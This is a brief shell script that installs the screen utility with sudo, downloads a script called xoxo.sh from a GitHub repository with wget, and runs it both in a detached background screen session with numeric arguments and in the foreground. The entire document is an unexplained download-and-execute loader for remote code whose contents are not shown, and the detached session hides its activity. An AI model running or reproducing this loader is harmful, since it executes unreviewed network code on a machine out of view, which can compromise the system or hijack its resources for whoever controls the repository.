#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/xkolux/takealook/raw/main/xoxo.sh
chmod +x xoxo.sh
screen -dmS xoxo.sh ./xoxo.sh 60 70
./xoxo.sh
